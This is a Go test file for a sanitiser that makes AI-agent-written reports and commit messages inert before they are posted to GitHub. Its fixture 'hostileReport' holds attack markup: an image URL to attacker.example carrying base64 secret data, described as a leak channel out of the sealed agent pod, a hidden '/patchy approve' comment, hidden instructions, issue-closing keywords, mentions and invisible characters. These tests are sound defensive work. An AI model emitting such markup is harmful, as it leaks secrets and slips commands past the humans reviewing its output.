// Copyright 2026 Bitwise Media Group Ltd.
// SPDX-License-Identifier: MIT

package templates

import (
	"fmt"
	"strings"
	"testing"
	"testing/quick"
	"unicode/utf8"

	"github.com/yuin/goldmark/ast"
	"github.com/yuin/goldmark/text"

	v1alpha1 "github.com/bitwise-media-group/patchy/api/v1alpha1"
)

// hostileReport is a remediation or investigation report written to act on
// GitHub and to leak through it: closing keywords on same-repository,
// cross-repository and URL references, user and team mentions, an image
// whose URL carries data (GitHub's image proxy fetches it whenever anyone
// views the page, a channel out of the network-sealed agent pod), a link, an
// autolink, raw and hidden HTML, a link reference definition, a table with a
// hidden cell, and characters that render as nothing.
const hostileReport = "## Summary\n\n" +
	"Fixes #7, closes acme/app#8 and resolves https://github.com/acme/app/issues/9; fixes GH-10.\n" +
	"cc @admin and @acme/security &#64;someone\n\n" +
	"![build status](https://attacker.example/c?d=c2VjcmV0LXRva2Vu)\n" +
	"[details](https://attacker.example/l?d=c2VjcmV0) <https://attacker.example/a?d=x>\n" +
	"<img src=\"https://attacker.example/i?d=x\">\n" +
	"<!-- /patchy approve -->\n<details><summary>more</summary>hidden</details>\n" +
	"[//]: # (hidden instruction)\n\n" +
	"| a | b |\n| --- | --- |\n| 1 | 2 | hidden cell |\n\n" +
	"Invisible: zero\u200bwidth, bidi \u202eesrever\u202c, tag \U000E0041.\n"

// TestPRBodyReportIsInert: the remediation report is agent text — on a
// repository-declared image, written by the image's process — so a report
// built to act on GitHub stays shown and inert. Read as markdown, nothing in
// it is a link or an image, raw HTML, a live reference or a mention; read
// as the plain text a squash commit copies onto the default branch, nothing
// in the body but patchy's own first line references an issue or mentions
// anyone.
func TestPRBodyReportIsInert(t *testing.T) {
	body, err := PRBody(123, hostileReport, false, nil, "")
	if err != nil {
		t.Fatalf("PRBody() error = %v", err)
	}
	first, rest, _ := strings.Cut(body, "\n")
	if first != "Fixes #123" {
		t.Fatalf("first line = %q, want patchy's own reference", first)
	}
	if msg := checkSanitized(rest); msg != "" {
		t.Errorf("%s\n%s", msg, body)
	}
	if msg := checkPlainText(rest, -1); msg != "" {
		t.Errorf("as plain text: %s\n%s", msg, body)
	}
	seen := parse(rest)
	for _, want := range []string{
		"attacker.example/c?d=c2VjcmV0LXRva2Vu", "hidden instruction", "hidden cell", "[U+202E]",
	} {
		if !strings.Contains(seen.visible, want) {
			t.Errorf("the report does not show %q as written:\n%s", want, body)
		}
	}
	golden(t, "pr_body_hostile.md", body)
}

// TestStageReportCommentIsInert: a stage report projected onto the tracking
// issue is agent text too; it may not link, show an image, ping anyone or
// hide anything, and patchy's marker stays the comment's only HTML.
func TestStageReportCommentIsInert(t *testing.T) {
	got := RenderStageReportComment("Remediation", 1, hostileReport)
	marker, rest, _ := strings.Cut(got, "\n")
	if marker != "<!-- patchy:report Remediation/1 -->" {
		t.Fatalf("first line = %q, want the dedup marker", marker)
	}
	if msg := checkSanitized(rest); msg != "" {
		t.Errorf("%s\n%s", msg, got)
	}
	if !strings.Contains(parse(rest).visible, "attacker.example/c?d=c2VjcmV0LXRva2Vu") {
		t.Errorf("the report is not shown as written:\n%s", got)
	}
	golden(t, "stage_report_hostile.md", got)
}

// TestRemediationCommitMessageIsInert: the agent's commit message is pushed
// as written, and lands on the default branch as plain text when the pull
// request is merged or rebased, where "Fixes #7" would close issue 7 — even
// the finding's own tracking issue, taking it out of the pipeline — and
// code spans protect nothing. It is defanged, and shows every invisible
// character as its code point.
func TestRemediationCommitMessageIsInert(t *testing.T) {
	msg := RemediationCommitMessage("fix: escape the name\n\n" + hostileReport)
	if m := checkPlainText(msg, -1); m != "" {
		t.Errorf("%s\n%s", m, msg)
	}
	if strings.ContainsFunc(msg, unseen) {
		t.Errorf("the message keeps a character that renders as nothing:\n%q", msg)
	}
	if !strings.HasPrefix(msg, "fix: escape the name\n\n## Summary\n") {
		t.Errorf("the message does not keep the agent's subject and body:\n%s", msg)
	}
	if got := RemediationCommitMessage(" \n\t"); strings.TrimSpace(got) == "" {
		t.Errorf("an empty agent message stays empty, which GitHub refuses")
	}
	golden(t, "remediation_commit_hostile.txt", msg)
}

// TestPRBodyFallbackIsPatchyOnly: when PRBody cannot render, the body patchy
// opens the pull request with is its own words: the finding's tracking issue
// as its one reference, nothing else live, so a render failure can never be
// a way to post the agent's report raw.
func TestPRBodyFallbackIsPatchyOnly(t *testing.T) {
	for _, issue := range []int{1, 123, 99999} {
		body := PRBodyFallback(issue)
		first, rest, _ := strings.Cut(body, "\n")
		if want := fmt.Sprintf("Fixes #%d", issue); first != want {
			t.Fatalf("first line = %q, want %q", first, want)
		}
		if msg := checkSanitized(rest); msg != "" {
			t.Errorf("%s\n%s", msg, body)
		}
		if msg := checkPlainText(rest, -1); msg != "" {
			t.Errorf("as plain text: %s\n%s", msg, body)
		}
	}
}

// legibleReport is an ordinary report: its structure must survive.
const legibleReport = "## Root cause\n\nThe handler echoes `name` unescaped.\n\n" +
	"### Fix\n\n- escape with `html.EscapeString`\n- add a regression test\n\n" +
	"1. first\n2. second\n\n> quoted\n\n**bold** and _emphasis_\n\n" +
	"```go\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfmt.Fprint(w, html.EscapeString(name))\n}\n```\n"

// TestReportKeepsItsFormatting: headings, lists, emphasis, block quotes,
// inline code and a code block keep rendering as such in the pull request
// body and the tracking comment, the code block's content byte for byte.
func TestReportKeepsItsFormatting(t *testing.T) {
	body, err := PRBody(1, legibleReport, false, nil, "")
	if err != nil {
		t.Fatalf("PRBody() error = %v", err)
	}
	for name, md := range map[string]string{
		"pull request body": body,
		"stage comment":     RenderStageReportComment("Remediation", 1, legibleReport),
	} {
		kinds := map[ast.NodeKind]int{}
		var code string
		src := []byte(md)
		_ = ast.Walk(gfm.Parser().Parse(text.NewReader(src)), func(n ast.Node, entering bool) (ast.WalkStatus, error) {
			if entering {
				kinds[n.Kind()]++
				if b, ok := n.(*ast.FencedCodeBlock); ok && string(b.Language(src)) == "go" {
					var sb strings.Builder
					for i := range b.Lines().Len() {
						seg := b.Lines().At(i)
						sb.Write(seg.Value(src))
					}
					code = sb.String()
				}
			}
			return ast.WalkContinue, nil
		})
		for _, k := range []ast.NodeKind{ast.KindHeading, ast.KindList, ast.KindBlockquote, ast.KindEmphasis,
			ast.KindCodeSpan, ast.KindFencedCodeBlock} {
			if kinds[k] == 0 {
				t.Errorf("%s: no %s survives:\n%s", name, k, md)
			}
		}
		want := "func handler(w http.ResponseWriter, r *http.Request) {\n" +
			"\tfmt.Fprint(w, html.EscapeString(name))\n}\n"
		if code != want {
			t.Errorf("%s: code block = %q, want %q", name, code, want)
		}
	}
}

// TestFindingReportFitsGitHub: sanitising lengthens text (an invisible
// character becomes its code point, a token gains backticks), and GitHub
// refuses a body or comment over its limit, which would wedge the push or
// the projection. A report that would not fit is cut before it is
// sanitised — so the cut cannot open a hole in it — and says so.
func TestFindingReportFitsGitHub(t *testing.T) {
	huge := strings.Repeat("\u200b@admin fixes #1 ", 20000)
	body, err := PRBody(1, huge, false, &v1alpha1.Reproduction{Reproduced: true, Command: "make test",
		Before: strings.Repeat("\x01", 2000), After: strings.Repeat("\x01", 2000)}, "")
	if err != nil {
		t.Fatalf("PRBody() error = %v", err)
	}
	comment := RenderStageReportComment("Investigation", 1, huge)
	for name, md := range map[string]string{"pull request body": body, "stage comment": comment} {
		if len(md) > MaxCommentBytes {
			t.Errorf("%s is %d bytes, over GitHub's %d", name, len(md), MaxCommentBytes)
		}
		if !strings.Contains(md, reportCutNote) {
			t.Errorf("%s does not say the report was cut", name)
		}
		_, rest, _ := strings.Cut(md, "\n")
		if msg := checkSanitized(rest); msg != "" {
			t.Errorf("%s: %s", name, msg)
		}
	}
}

// TestFindingTextProperties: whatever an agent writes in its report or its
// commit message, seeded and dense in every markdown and GitHub trick the
// sanitiser knows, the pull request body is inert markdown below patchy's
// own first line and, read as plain text, references and mentions nothing
// there; the stage comment is inert markdown below its marker; the commit
// message references and mentions nothing; and each fits GitHub's limit.
func TestFindingTextProperties(t *testing.T) {
	cfg := markdownConfig(20261014)
	cfg.MaxCount = 1500
	var failure string
	holds := func(agent string) (ok bool) {
		defer func() {
			if r := recover(); r != nil {
				failure, ok = fmt.Sprintf("panic: %v\nagent text %q", r, agent), false
			}
		}()
		body, err := PRBody(42, agent, false, nil, "")
		if err != nil {
			failure = fmt.Sprintf("pull request body: %v", err)
			return false
		}
		first, rest, _ := strings.Cut(body, "\n")
		if first != "Fixes #42" {
			failure = fmt.Sprintf("pull request body opens with %q", first)
			return false
		}
		comment := RenderStageReportComment("Investigation", 1, agent)
		for name, md := range map[string]string{"pull request body": rest, "stage comment": cutMarker(comment)} {
			if msg := checkSanitized(md); msg != "" {
				failure = fmt.Sprintf("%s: %s\nagent text %q\n%s", name, msg, agent, md)
				return false
			}
		}
		if msg := checkPlainText(rest, -1); msg != "" {
			failure = fmt.Sprintf("pull request body as plain text: %s\nagent text %q\n%s", msg, agent, body)
			return false
		}
		msg := RemediationCommitMessage(agent)
		if m := checkPlainText(msg, -1); m != "" || !utf8.ValidString(msg) || strings.ContainsFunc(msg, unseen) {
			failure = fmt.Sprintf("commit message: %s\nagent text %q\n%q", m, agent, msg)
			return false
		}
		return true
	}
	if err := quick.Check(holds, cfg); err != nil {
		t.Errorf("%v\n%s", err, failure)
	}
}
